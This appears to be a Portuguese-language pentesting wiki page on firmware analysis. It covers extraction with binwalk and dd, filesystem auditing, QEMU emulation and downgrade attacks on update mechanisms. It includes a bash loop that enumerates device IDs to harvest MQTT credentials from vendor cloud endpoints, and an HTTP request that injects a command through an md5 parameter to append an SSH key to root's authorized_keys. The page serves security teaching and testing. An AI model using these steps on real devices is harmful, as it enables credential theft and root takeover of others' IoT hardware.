# Análise de Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introdução**

### Recursos relacionados


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware é o software essencial que permite que os dispositivos funcionem corretamente, gerenciando e facilitando a comunicação entre os componentes de hardware e o software com que os usuários interagem. Ele é armazenado em memória permanente, garantindo que o dispositivo possa acessar instruções vitais desde o momento em que é ligado, levando ao carregamento do sistema operacional. Examinar e potencialmente modificar o firmware é um passo crítico para identificar vulnerabilidades de segurança.

## **Coleta de Informações**

**Coleta de informações** é um passo inicial crítico para entender a composição de um dispositivo e as tecnologias que ele utiliza. Este processo envolve coletar dados sobre:

- A arquitetura da CPU e o sistema operacional que ele executa
- Especificações do bootloader
- Layout de hardware e datasheets
- Métricas da base de código e localizações das fontes
- Bibliotecas externas e tipos de licença
- Históricos de atualização e certificações regulatórias
- Diagramas arquiteturais e de fluxo
- Avaliações de segurança e vulnerabilidades identificadas

Para isso, ferramentas de open-source intelligence (OSINT) são inestimáveis, assim como a análise de quaisquer componentes de software open-source disponíveis por meio de processos de revisão manuais e automatizados. Ferramentas como [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) oferecem análise estática gratuita que pode ser aproveitada para encontrar possíveis problemas.

## **Obtenção do Firmware**

Obter o firmware pode ser abordado por vários meios, cada um com seu nível de complexidade:

- **Diretamente** da fonte (desenvolvedores, fabricantes)
- **Construindo** a partir das instruções fornecidas
- **Baixando** de sites de suporte oficiais
- Utilizando queries **Google dork** para encontrar arquivos de firmware hospedados
- Acessando **cloud storage** diretamente, com ferramentas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **updates** via técnicas man-in-the-middle
- **Extraindo** do dispositivo através de conexões como **UART**, **JTAG**, ou **PICit**
- **Sniffing** por solicitações de atualização na comunicação do dispositivo
- Identificando e usando endpoints de atualização **hardcoded**
- **Dumping** do bootloader ou da rede
- **Removendo e lendo** o chip de armazenamento, quando tudo mais falhar, usando ferramentas de hardware apropriadas

## Analisando o firmware

Agora que você **tem o firmware**, é necessário extrair informações sobre ele para saber como tratá-lo. Diferentes ferramentas que você pode usar para isso:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Se você não encontrar muita coisa com essas ferramentas, verifique a **entropy** da imagem com `binwalk -E <bin>`; se a entropy for baixa, então provavelmente não está encrypted. Se a entropy for alta, é provável que esteja encrypted (ou compressed de alguma forma).

Além disso, você pode usar essas ferramentas para extrair **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) para inspecionar o arquivo.

### Obtendo o filesystem

Com as ferramentas comentadas acima, como `binwalk -ev <bin>`, você deve ter conseguido **extrair o filesystem**.\
Binwalk geralmente extrai isso dentro de uma **pasta nomeada como o tipo de filesystem**, que normalmente é um dos seguintes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extração Manual do Filesystem

Às vezes, o binwalk **não terá o magic byte do filesystem em suas assinaturas**. Nesses casos, use binwalk para **encontrar o offset do filesystem e carve the compressed filesystem** do binário e **extrair manualmente** o filesystem de acordo com seu tipo usando os passos abaixo.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Execute o seguinte **dd command** para realizar o carving do sistema de arquivos Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativamente, o seguinte comando também pode ser executado.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado no exemplo acima)

`$ unsquashfs dir.squashfs`

Os arquivos estarão no diretório "`squashfs-root`" em seguida.

- Arquivos CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de arquivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de arquivos ubifs com NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisando o firmware

Uma vez obtido o firmware, é essencial dissecá-lo para entender sua estrutura e possíveis vulnerabilidades. Esse processo envolve utilizar várias ferramentas para analisar e extrair dados valiosos da imagem do firmware.

### Ferramentas de análise inicial

Um conjunto de comandos é fornecido para a inspeção inicial do arquivo binário (referido como `<bin>`). Esses comandos ajudam a identificar tipos de arquivo, extrair strings, analisar dados binários e entender os detalhes de partições e sistemas de arquivos:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Para avaliar o estado de criptografia da imagem, a **entropia** é verificada com `binwalk -E <bin>`. Baixa entropia sugere falta de criptografia, enquanto alta entropia indica possível criptografia ou compressão.

Para extrair **arquivos embutidos**, ferramentas e recursos como a documentação **file-data-carving-recovery-tools** e **binvis.io** para inspeção de arquivos são recomendados.

### Extraindo o sistema de arquivos

Usando `binwalk -ev <bin>`, normalmente é possível extrair o sistema de arquivos, frequentemente em um diretório nomeado conforme o tipo de sistema de arquivos (por exemplo, squashfs, ubifs). No entanto, quando o **binwalk** falha em reconhecer o tipo de sistema de arquivos devido à ausência de bytes mágicos, é necessária a extração manual. Isso envolve usar `binwalk` para localizar o offset do sistema de arquivos, seguido pelo comando `dd` para extrair o sistema de arquivos:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Em seguida, dependendo do tipo de sistema de arquivos (por exemplo, squashfs, cpio, jffs2, ubifs), comandos diferentes são usados para extrair manualmente o conteúdo.

### Análise do sistema de arquivos

Com o sistema de arquivos extraído, começa a busca por falhas de segurança. Dá-se atenção a daemons de rede inseguros, credenciais hardcoded, API endpoints, funcionalidades do servidor de atualização, código não compilado, scripts de inicialização e binários compilados para análise offline.

**Locais-chave** e **itens** a inspecionar incluem:

- **etc/shadow** and **etc/passwd** para credenciais de usuário
- Certificados e chaves SSL em **etc/ssl**
- Arquivos de configuração e scripts em busca de vulnerabilidades potenciais
- Binários embutidos para análise adicional
- Servidores web e binários comuns de dispositivos IoT

Várias ferramentas ajudam a descobrir informações sensíveis e vulnerabilidades dentro do sistema de arquivos:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) para busca de informação sensível
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para análise completa de firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), and [**EMBA**](https://github.com/e-m-b-a/emba) para análise estática e dinâmica

### Verificações de segurança em binários compilados

Tanto o código-fonte quanto os binários compilados encontrados no sistema de arquivos devem ser examinados em busca de vulnerabilidades. Ferramentas como **checksec.sh** para binários Unix e **PESecurity** para binários Windows ajudam a identificar binários desprotegidos que podem ser explorados.

## Coleta de cloud config e credenciais MQTT via tokens de URL derivados

Muitos hubs IoT obtêm a configuração por-dispositivo a partir de um cloud endpoint que se parece com:

- `https://<api-host>/pf/<deviceId>/<token>`

During firmware analysis you may find that `<token>` is derived locally from the device ID using a hardcoded secret, for example:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Esse design permite que qualquer pessoa que descubra um deviceId e o STATIC_KEY reconstrua a URL e obtenha a cloud config, frequentemente revelando credenciais MQTT em texto claro e prefixos de tópico.

Fluxo de trabalho prático:

1) Extrair deviceId dos logs de boot UART

- Conecte um adaptador UART 3.3V (TX/RX/GND) e capture os logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Procure por linhas que imprimam o padrão de URL do cloud config e o endereço do broker, por exemplo:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperar STATIC_KEY e o algoritmo do token a partir do firmware

- Carregue os binários no Ghidra/radare2 e procure pelo caminho de configuração ("/pf/") ou pelo uso de MD5.
- Confirme o algoritmo (por exemplo, MD5(deviceId||STATIC_KEY)).
- Derive o token em Bash e converta o digest para maiúsculas:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Harvest cloud config e MQTT credentials

- Monte a URL e recupere o JSON com curl; analise com jq para extrair secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abusar do plaintext MQTT e ACLs fracas de tópico (se presentes)

- Use credenciais recuperadas para inscrever-se nos tópicos de manutenção e procurar por eventos sensíveis:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerar IDs de dispositivo previsíveis (em escala, com autorização)

- Muitos ecossistemas incorporam bytes OUI/product/type do fabricante seguidos por um sufixo sequencial.
- Você pode iterar IDs candidatos, derivar tokens e buscar configs programaticamente:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notas
- Sempre obtenha autorização explícita antes de tentar enumeração em massa.
- Prefira emulação ou static analysis para recuperar segredos sem modificar o hardware alvo quando possível.

O processo de emular firmware permite **dynamic analysis** tanto da operação de um dispositivo quanto de um programa individual. Essa abordagem pode encontrar desafios com dependências de hardware ou arquitetura, mas transferir o root filesystem ou binários específicos para um dispositivo com arquitetura e endianness correspondentes, como um Raspberry Pi, ou para uma máquina virtual pré-compilada, pode facilitar testes adicionais.

### Emulando Binários Individuais

Ao examinar programas individuais, identificar a endianness e a arquitetura de CPU do programa é crucial.

#### Exemplo com Arquitetura MIPS

Para emular um binário com arquitetura MIPS, pode-se usar o comando:
```bash
file ./squashfs-root/bin/busybox
```
E para instalar as ferramentas de emulação necessárias:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Para MIPS (big-endian), `qemu-mips` é usado, e para binários little-endian, `qemu-mipsel` seria a escolha.

#### Emulação da Arquitetura ARM

Para binários ARM, o processo é similar, com o emulador `qemu-arm` sendo utilizado para emulação.

### Emulação de Sistema Completo

Ferramentas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) e outras facilitam a emulação completa de firmware, automatizando o processo e auxiliando na análise dinâmica.

## Análise Dinâmica na Prática

Nesta fase, um ambiente de dispositivo real ou emulado é usado para análise. É essencial manter acesso shell ao OS e ao sistema de arquivos. A emulação pode não reproduzir perfeitamente as interações de hardware, exigindo reinicializações ocasionais da emulação. A análise deve revisitar o sistema de arquivos, explorar páginas web expostas e serviços de rede, e investigar vulnerabilidades no bootloader. Testes de integridade do firmware são críticos para identificar potenciais backdoors.

## Técnicas de Análise em Tempo de Execução

A análise em tempo de execução envolve interagir com um processo ou binário em seu ambiente de execução, usando ferramentas como gdb-multiarch, Frida e Ghidra para definir breakpoints e identificar vulnerabilidades através de fuzzing e outras técnicas.

## Exploração de Binaries e Proof-of-Concept

Desenvolver um PoC para vulnerabilidades identificadas requer um profundo entendimento da arquitetura alvo e programação em linguagens de baixo nível. Proteções de runtime em binários de sistemas embarcados são raras, mas quando presentes, técnicas como Return Oriented Programming (ROP) podem ser necessárias.

## Sistemas Operacionais Preparados para Análise de Firmware

Sistemas como [AttifyOS](https://github.com/adi0x90/attifyos) e [EmbedOS](https://github.com/scriptingxss/EmbedOS) fornecem ambientes pré-configurados para testes de segurança de firmware, equipados com as ferramentas necessárias.

## Sistemas Preparados para analisar Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS é uma distro destinada a ajudar você a realizar security assessment e pentesting de dispositivos Internet of Things (IoT). Economiza muito tempo ao fornecer um ambiente pré-configurado com todas as ferramentas necessárias carregadas.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Sistema operacional para testes de segurança embarcada baseado no Ubuntu 18.04 pré-carregado com ferramentas de firmware security testing.

## Ataques de Downgrade de Firmware & Mecanismos de Atualização Inseguros

Mesmo quando um fornecedor implementa verificações de assinatura criptográfica para imagens de firmware, a proteção contra version rollback (downgrade) é frequentemente omitida. Quando o boot- ou recovery-loader apenas verifica a assinatura com uma chave pública embutida, mas não compara a *versão* (ou um contador monotônico) da imagem sendo flashada, um atacante pode legitimamente instalar um firmware antigo e vulnerável que ainda possui uma assinatura válida e, assim, reintroduzir vulnerabilidades corrigidas.

Fluxo típico de ataque:

1. **Obter uma imagem assinada antiga**
* Pegá-la do portal de downloads público do fornecedor, CDN ou site de suporte.
* Extrair de aplicações companion mobile/desktop (por exemplo dentro de um Android APK sob `assets/firmware/`).
* Recuperá-la de repositórios de terceiros como VirusTotal, arquivos da Internet, fóruns, etc.
2. **Enviar ou servir a imagem ao dispositivo** via qualquer canal de atualização exposto:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Muitos dispositivos IoT de consumo expõem endpoints HTTP(S) *não autenticados* que aceitam blobs de firmware codificados em Base64, decodificam-nos server-side e disparam recovery/upgrade.
3. Após o downgrade, explorar uma vulnerabilidade que foi corrigida na release mais recente (por exemplo, um filtro de command-injection que foi adicionado posteriormente).
4. Opcionalmente, flashar a imagem mais recente de volta ou desabilitar atualizações para evitar detecção uma vez que a persistência seja obtida.

### Exemplo: Command Injection Após o Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
No firmware vulnerável (rebaixado), o parâmetro `md5` é concatenado diretamente em um comando de shell sem sanitização, permitindo a injeção de comandos arbitrários (aqui – habilitando acesso root via chave `SSH`). Versões posteriores do firmware introduziram um filtro básico de caracteres, mas a ausência de proteção contra downgrade torna a correção inútil.

### Extraindo Firmware de Aplicativos Móveis

Muitos fabricantes empacotam imagens completas de firmware dentro de seus aplicativos móveis companion para que o app possa atualizar o dispositivo via Bluetooth/Wi‑Fi. Esses pacotes costumam ser armazenados sem criptografia no APK/APEX em caminhos como `assets/fw/` ou `res/raw/`. Ferramentas como `apktool`, `ghidra` ou mesmo o simples `unzip` permitem que você extraia imagens assinadas sem tocar no hardware físico.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Lista de verificação para avaliar a lógica de atualização

* O transporte/autenticação do *update endpoint* está adequadamente protegido (TLS + autenticação)?
* O dispositivo compara **números de versão** ou um **contador monotônico anti-rollback** antes do flash?
* A imagem é verificada dentro de uma cadeia de boot seguro (por exemplo, assinaturas verificadas pelo código ROM)?
* O código userland realiza checagens adicionais de sanidade (por exemplo, mapa de partições permitido, número do modelo)?
* Fluxos de atualização *parciais* ou *de backup* estão reutilizando a mesma lógica de validação?

> 💡  Se algum dos itens acima estiver faltando, a plataforma provavelmente é vulnerável a rollback attacks.

## Firmwares vulneráveis para praticar

Para praticar a descoberta de vulnerabilidades em firmware, use os seguintes projetos de firmware vulneráveis como ponto de partida.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Referências

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Treinamento e Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
